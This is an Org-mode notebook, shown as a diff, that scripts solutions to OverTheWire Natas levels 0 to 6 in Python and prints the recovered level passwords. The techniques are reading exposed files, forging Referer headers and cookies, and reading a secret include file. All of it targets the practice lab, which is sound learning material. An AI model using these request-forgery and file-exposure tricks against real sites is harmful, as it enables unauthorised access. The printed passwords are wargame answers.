@@ -1,0 +1,221 @@
+#+TITLE: OverTheWire Natas
+#+SETUPFILE: https://fniessen.github.io/org-html-themes/org/theme-readtheorg.setup
+#+OPTIONS: num:nil
+#+EXPORT_FILE_NAME: index
+#+PROPERTY: header-args :eval never-export
+#+PROPERTY: header-args:python :session *Py* :tangle ape.py
+
+* About
+This script contains my efforts to script the solutions to the natas challenges on [[https://overthewire.org][OverTheWire]]. This script makes heavy use of the paramiko module to run ssh commands
+
+* Setup
+#+begin_src python :results silent
+from requests.auth import HTTPBasicAuth
+import json
+import re
+import requests
+
+host = "natas.labs.overthewire.org"
+credentials = {"natas0": "natas0"}
+progress_file = 'natas.progress'
+
+def save():
+    with open(progress_file, 'w') as f:
+        json.dump(credentials, f)
+
+def load():
+    global credentials
+    with open(progress_file, 'r') as f:
+        credentials = json.load(f)
+
+try:
+    load()
+except:
+    pass
+
+try:
+    os.mkdir('working')
+except:
+    pass
+
+def get_url(username: str):
+    return F"http://{username}.{host}"
+#+end_src
+
+* Natas0 => Natas1
+
+#+begin_src python :results none
+def natas0():
+    username = 'natas0'
+    print(F"Pwning {username}")
+    url = get_url(username)
+    r = requests.get(url, auth=HTTPBasicAuth(username, credentials[username]))
+
+    passwd = re.findall(r'natas1 is (\w+)', r.text)[0]
+
+    credentials["natas1"] = passwd
+    save()
+#+end_src
+
+#+begin_src python :exports none :tangle no
+natas0()
+credentials['natas1']
+#+end_src
+
+#+RESULTS:
+: gtVrDuiDfck831PqWsLEZy5gyDz1clto
+
+* Natas1 => Natas2
+
+#+begin_src python :results none
+def natas1():
+    username = 'natas1'
+    print(F"Pwning {username}")
+    url = get_url(username)
+    r = requests.get(url, auth=HTTPBasicAuth(username, credentials[username]))
+
+    passwd = re.findall(r'natas2 is (\w+)', r.text)[0]
+
+    credentials["natas2"] = passwd
+    save()
+#+end_src
+
+#+begin_src python :exports none :tangle no
+natas1()
+credentials['natas2']
+#+end_src
+
+#+RESULTS:
+: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
+
+* Natas2 => Natas3
+
+There appears to be a /files/ directory upon looking at the html code.
+Checking it out shows that there is a users.txt file which has the password.
+
+#+begin_src python :results none
+def natas2():
+    username = 'natas2'
+    print(F"Pwning {username}")
+    url = get_url(username) + "/files/users.txt"
+    r = requests.get(url, auth=HTTPBasicAuth(username, credentials[username]))
+
+    passwd = re.findall(r'natas3.*', r.text)[0].split(':')[1]
+
+    credentials["natas3"] = passwd
+    save()
+#+end_src
+
+#+begin_src python :exports none :tangle no
+natas2()
+credentials['natas3']
+#+end_src
+
+#+RESULTS:
+: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+
+* Natas3 => Natas4
+
+#+begin_src python :results none
+def natas3():
+    username = 'natas3'
+    print(F"Pwning {username}")
+    # url = get_url(username) + "/robots.txt"
+    url = get_url(username) + "/s3cr3t/users.txt"
+    r = requests.get(url, auth=HTTPBasicAuth(username, credentials[username]))
+
+    passwd = re.findall(r'natas4.*', r.text)[0].split(':')[1]
+
+    credentials["natas4"] = passwd
+    save()
+#+end_src
+
+#+begin_src python :exports none :tangle no
+natas3()
+credentials['natas4']
+#+end_src
+
+#+RESULTS:
+: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+* Natas4 => Natas5
+
+Setting the =Referer= HTTP header is the solution for this challenge
+
+#+begin_src python :results none
+def natas4():
+    username = 'natas4'
+    print(F"Pwning {username}")
+    url = get_url(username)
+    r = requests.get(url, auth=HTTPBasicAuth(username, credentials[username]), headers={'Referer':get_url('natas5')+"/"})
+
+    passwd = re.findall(r'natas5 is (\w+)', r.text)[0]
+
+    credentials["natas5"] = passwd
+    save()
+#+end_src
+
+#+begin_src python :exports none :tangle no
+natas4()
+credentials['natas5']
+#+end_src
+
+#+RESULTS:
+: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+
+* Natas5 => Natas6
+
+#+begin_src python :results none
+def natas5():
+    username = 'natas5'
+    print(F"Pwning {username}")
+    url = get_url(username)
+    r = requests.get(url, auth=HTTPBasicAuth(username, credentials[username]), cookies={'loggedin': '1'})
+
+    passwd = re.findall(r'natas6 is (\w+)', r.text)[0]
+
+    credentials["natas6"] = passwd
+    save()
+#+end_src
+
+#+begin_src python :exports none :tangle no
+natas5()
+credentials['natas6']
+#+end_src
+
+#+RESULTS:
+: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+* Natas6 => Natas7
+
+The form tests our input against a secret that is read from a file.
+We can read this file and determine what the secret is.
+
+#+begin_src python :results none
+def natas6():
+    username = 'natas6'
+    print(F"Pwning {username}")
+    base_url = get_url(username)
+
+    url = base_url + '/includes/secret.inc'
+    r = requests.get(url, auth=HTTPBasicAuth(username, credentials[username]))
+
+    secret = re.findall(r'"(.*)"', r.text)[0]
+
+    data = {'secret': secret, 'submit': 'Submit+Query'}
+    r = requests.post(base_url, auth=HTTPBasicAuth(username, credentials[username]), data=data)
+    print(r.text)
+
+    passwd = re.findall(r'natas7 is (\w+)', r.text)[0]
+
+    credentials["natas7"] = passwd
+    save()
+#+end_src
+
+#+begin_src python :exports none :tangle no
+natas6()
+credentials['natas7']
+#+end_src
+
+#+RESULTS:
+: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
